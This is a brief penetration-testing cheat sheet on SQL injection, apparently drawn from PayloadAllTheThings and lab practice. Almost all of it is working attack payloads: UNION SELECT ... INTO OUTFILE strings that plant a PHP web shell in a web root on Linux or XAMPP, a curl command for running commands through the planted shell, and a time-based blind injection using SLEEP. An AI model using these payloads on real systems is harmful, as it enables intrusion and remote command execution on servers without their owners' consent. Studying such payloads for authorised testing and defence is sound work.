# SQL Injection

## Into outfile method (PayloadAllTheThings)
- SQL Injection write to file via shell
```
test' union select '<?php echo system($_REQUEST["bingo"]); ?>' into outfile '/srv/http/cmd.php' -- -
```
```
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -' 
```
- Then, `curl http://<ip>/command.php?cmd=<cmdlet>`.

- If it does not work, encode all characters and send via `curl`.

## Blind
```
TEST' UNION SELECT SLEEP(10);-- -
```
- PG-Practice Blind SQL Injection, check for walkthrough
